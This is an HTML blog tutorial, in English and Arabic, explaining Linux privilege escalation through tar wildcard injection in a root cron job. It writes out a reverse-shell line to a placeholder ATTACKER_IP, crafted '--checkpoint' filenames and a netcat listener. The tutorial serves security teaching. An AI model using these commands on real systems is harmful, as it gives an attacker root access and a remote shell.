@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Privilege Escalation - Wildcard Injection | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">linux-privesc</a><span class="sep">/</span><span>Privilege Escalation - Wildcard Injection</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">linux-privesc</span>
+<span class="post-date">2023-08-10</span>
+</div>
+<h1 class="post-title">Privilege Escalation - Wildcard Injection</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will explain privilege escalation through Wildcard Injection.</p>
+<p>Before we start with the scenario, we will first understand what wildcards are and how they work. We will also walk through an example of wildcard injection to make sure the concept is clear, and then we will apply the actual scenario that allows us to escalate privileges.</p>
+<h2>What Are Wildcards?</h2>
+<p>Wildcards are special symbols that make it easier for system administrators to work with files.</p>
+<p>Examples of wildcard symbols:</p>
+<ul>
+<li><strong><code>*</code></strong> (asterisk): Matches any characters or numbers in a filename, including nothing at all.</li>
+<li><strong><code>~</code></strong> (tilde): Refers to the home directory of the user who executed the command.</li>
+</ul>
+<p>There are more wildcard symbols, but the asterisk is the one we care about for this attack.</p>
+<h3>Example of the Asterisk Wildcard</h3>
+<p>Let us take an example together to understand exactly what <code>*</code> does.</p>
+<p>Suppose we have two files: <code>file.txt</code> and <code>file2.txt</code>, and the owner of both files is the user <code>jehad</code>. Now we want to change the owner of both files from <code>jehad</code> to <code>test</code> using the <code>chown</code> command:</p>
+<pre><code class="language-bash">chown test [name of file]
+</code></pre>
+<p>But imagine if we had one hundred files that we need to change ownership for. Are we going to run the <code>chown</code> command one hundred times? That would be exhausting. This is where the asterisk wildcard comes in -- it will change all files in the directory from <code>jehad</code> to <code>test</code> in a single command:</p>
+<pre><code class="language-bash">chown test *
+</code></pre>
+<p>So now you understand what the asterisk means -- it refers to any file in the directory, whether the filename starts with numbers or letters.</p>
+<h2>Understanding Wildcard Injection</h2>
+<p>Now let us look at the concept of wildcard injection. If we create a file named <code>--help</code> (which is the same as an option that the <code>chown</code> command supports), and then we run the same command we used before, what happens?</p>
+<p>The system executes the <code>--help</code> option and abandons the actual task of the command we ran!</p>
+<p>This is exactly the exploitation concept: there may be specific options within the command being executed that can be used to run a malicious file.</p>
+<h2>Privilege Escalation Scenario</h2>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/1.png" alt="Step 1" loading="lazy"></figure>
+<h3>Initial Access</h3>
+<p>As usual, we are logged in as the user <code>test</code> and we want to reach root privileges.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/2.png" alt="Step 2" loading="lazy"></figure>
+<h3>Identifying the Cron Job</h3>
+<p>We notice there is a scheduled cron job running every minute with root privileges. What it does is navigate to the <code>/opt</code> directory first, then create a compressed archive called <code>backup.tgz</code> that contains all files and directories inside the <code>/opt</code> directory.</p>
+<p>Since it uses the asterisk wildcard (<code>*</code>), it means all files and directories will be included. Now we need to look for options specific to the <code>tar</code> command that can execute a malicious file for us.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/3.png" alt="Step 3" loading="lazy"></figure>
+<h3>Exploiting tar Options</h3>
+<p>We have these two options available for the <code>tar</code> command:</p>
+<ul>
+<li><strong><code>--checkpoint=[n]</code></strong> -- This specifies after how many records to display a progress message. It controls the timing before executing the action in the next option.</li>
+<li><strong><code>--checkpoint-action=exec</code></strong> -- This specifies a command to execute at each checkpoint.</li>
+</ul>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/4.png" alt="Step 4" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/5.png" alt="Step 5" loading="lazy"></figure>
+<h3>Creating the Malicious Payload</h3>
+<p>First, we create a shell script in the <code>/opt</code> directory containing a reverse shell payload:</p>
+<pre><code class="language-bash"># Create the reverse shell script in /opt
+echo 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4242 0&gt;&amp;1' &gt; /opt/shell.sh
+</code></pre>
+<p>Then we create two files whose names match the <code>tar</code> options that will execute our malicious file:</p>
+<pre><code class="language-bash">touch '/opt/--checkpoint=1'
+touch '/opt/--checkpoint-action=exec=sh shell.sh'
+</code></pre>
+<p>When <code>tar</code> runs with the <code>*</code> wildcard, it will interpret these filenames as command-line options. The <code>--checkpoint=1</code> file tells <code>tar</code> to trigger a checkpoint after every record, and the <code>--checkpoint-action=exec=sh shell.sh</code> file tells it to execute our <code>shell.sh</code> script at each checkpoint.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/6.png" alt="Step 6" loading="lazy"></figure>
+<h3>Getting the Reverse Shell</h3>
+<p>Now we simply start a listener on the same port as the reverse shell we specified, which is port 4242, and wait:</p>
+<pre><code class="language-bash">nc -lvnp 4242
+</code></pre>
+<p>After one minute passes (when the cron job fires), we receive a shell back with root privileges.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/7.png" alt="Step 7" loading="lazy"></figure>
+<h3>Result</h3>
+<p>With that, we have obtained the highest privileges on the system through Wildcard Injection. The key takeaway is that any time a command is run with the <code>*</code> wildcard by a privileged user on a directory where we have write access, there is potential for injection through crafted filenames.</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/8.png" alt="Step 8" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح رفع الصلاحيات عن طريق ال Wildcard injection</p>
+<p>قبل نبدا في السنياريو راح نعرف ايش هي ال Wildcard وايش فكرتها وراح نطبق مثال على Wildcard injection عشان بس ابيها ترسخ فبالكم وبعد كذا راح نطبق السيناريو اللي راح يمكننا من رفع الصلاحيات عن طريق Wildcard injection</p>
+<p>اول شي ايش هي ال Wildcard هي رموز معينه تسهل لمدير النظام ف التعامل مع الملفات</p>
+<p>امثلة على الرموز :</p>
+<p>* : تتطابق علامة النجمة مع اي حرف او رقم يحتويه الملف ، بما في ذلك لا شيء.</p>
+<p>~ : تشير الى مجلد ال home الخاص بالمستخدم اللي نفذ هذه العلامة</p>
+<p>طبعا في اكثر من رمز ف نحن يهمنا رمز النجمة</p>
+<p>خلونا ناخذ مثال مع بعض عشان نفهم ايش هي ال * بالضبط</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/1.png" alt="Step 1" loading="lazy"></figure>
+
+<p>نلاحظ انه عندنا ملفين file2.txt و file.txt نلاحظ انه المالك للملفين هو المستخدم jehad طيب الان راح اغير المالك للملفين من jehad الى test</p>
+<p>عن طريق امر chown</p>
+<p>استخدام الامر: chown test [name of file]</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/2.png" alt="Step 2" loading="lazy"></figure>
+
+<p>بس نفترض لو في مئة ملف ابي اغيرهم من المالك jehad الى test بننفذ امر chown مئة مرة؟</p>
+<p>مستحيل هذا الشي بيكون متعب ف هنا نجي الى رمز النجمة راح تغير لنا جميع الملفات اللي على المجلد من jehad الى test في امر واحد خلونا نشوف مع بعض:</p>
+<p>حلو الان انتوا فهمتوا ايش تعني النجمة تعني انه اي ملف على المجلد سواء كان يبدا ب ارقام او احرف</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/3.png" alt="Step 3" loading="lazy"></figure>
+
+<p>الان نجي لفكرة ال Wildcard injection</p>
+<p>اللحين لو مثلا انا سويت ملف اسمه help-- بنفس اسم اوبشن يحتويه امر chown ورجعت نفذت هذا الامر اللي سويناه قبل ايش راح يصير !</p>
+<p>نلاحظ انه نفذلي اوبشن help وترك مهمة الامر اللي نفذته !!!</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/4.png" alt="Step 4" loading="lazy"></figure>
+
+<p>هنا فكرة الاستغلال بالضبط انه ممكن في اوبشنات خاصه بنفس الامر اللي بيتنفذ ممكن انها تنفذلي ملف خبيث</p>
+<p>الشرح:</p>
+<p>كالعادة انا داخل بيوزر test ونبي نوصل الى صلاحية root</p>
+<p>نلاحظ ان في جدولة تتنفذ كل دقيقة بصلاحية root فكرتها انه راح يروح لمجلد opt اول شي و ينشأ ملف مضغوط اسمه backup.tgz يحتوي على جميع الملفات والمجلدات الموجودة في المجلد اللي اسمه opt</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/5.png" alt="Step 5" loading="lazy"></figure>
+
+<p>بما انه حاط رمز النجمة يعني جميع الملفات والمجلدات الان راح ابحث عن option يخص امر tar يفنذلي ملف خبيث</p>
+<p>عندنا هذي الاوبشنين خاصه ب امر tar :</p>
+<p>checkpoint=[n]–</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/6.png" alt="Step 6" loading="lazy"></figure>
+
+<p>checkpoint-action=exec–</p>
+<p>اول امر اللي اسمه checkpoint هو الوقت اللي راح ياخذه قبل تنفيذ الأمر اللي موجود ف اوبشن checkpoint-action=exec</p>
+<p>الان راح انشأ ملف sh على مجلد ال opt يحتوي على reverse shell</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/7.png" alt="Step 7" loading="lazy"></figure>
+
+<p>بعد كذا راح انشأ ملفين بنفس اسامي الاوبشنين اللي راح ينفذون لي الملف الخبيث</p>
+<p>الان فقط راح نشغل التنصت على نفس البورت حق ال reverse shell اللي انا حطيته اللي هو 4242 وننتظر</p>
+<p>بعد مامرت دقيقة رجعلتي جلسة بصلاحية ال root</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-wildcard-injection/8.png" alt="Step 8" loading="lazy"></figure>
+
+<p>وبكذا حلصنا على اعلى صلاحية عن طريق Wildcard injection</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
